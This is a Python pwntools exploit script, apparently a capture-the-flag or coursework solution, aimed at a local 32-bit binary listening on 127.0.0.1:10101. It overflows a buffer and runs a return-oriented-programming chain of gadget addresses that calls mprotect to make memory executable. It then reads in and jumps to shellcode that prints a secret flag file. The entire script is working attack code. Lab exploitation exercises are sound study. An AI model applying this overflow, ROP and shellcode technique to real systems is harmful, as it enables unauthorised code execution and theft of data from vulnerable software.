#!/usr/bin/env python3
from pwn import *
context.arch = 'i686'

sc = asm(shellcraft.cat('10101_YAKOBCHUK_Dmytro.secret') + shellcraft.echo('\n') + shellcraft.exit(13))

#r = process('setarch -R ./10101_YAKOBCHUK_Dmytro', shell=True, env = {})
r = remote('127.0.0.1', 10101)

rnop = p32(0x08049d20) # ret
peax = p32(0x080b0cda) # pop eax ; ret
peaxedxebx = p32(0x08058958) # pop eax ; pop edx ; pop ebx ; ret
mecxeax = p32(0x08093df8) # mov ecx, eax ; mov eax, ecx ; ret
syscall = p32(0x08071c50) # int 0x80 ; ret

rwx = p32(0x08048000)

buf = b'A' * 898
buf += p32(1337)
buf += rnop * 500

# mprotect rwx
buf += peax
buf += p32(0x1000)
buf += mecxeax
buf += peaxedxebx # ecx = 0x1000, size
buf += p32(0x7d)  # eax = 0x7d, syscall mprotect
buf += p32(7)     # edx = 7, rwx
buf += rwx        # ebx = buf
buf += syscall

# read shellcode
buf += peax
buf += rwx
buf += mecxeax
buf += peaxedxebx
buf += p32(3)       # eax, syscall read
buf += p32(len(sc)) # edx, size
buf += p32(0)       # ebx, fd
buf += syscall

# jump shellcode
buf += rwx

buf = buf.ljust(3596+898+4, b'B')
buf += p32(0xffffd000) 

#pause()
log.info('=== buffer')
print(hexdump(buf))

#pause()
r.readline()
r.writeline(buf)
r.readuntil('GRANTED!')

log.info('=== shellcode')
print(hexdump(sc))
r.writeline(sc)

#r.interactive()
log.success(f'FLAG {r.readall().strip().decode("ascii")}')
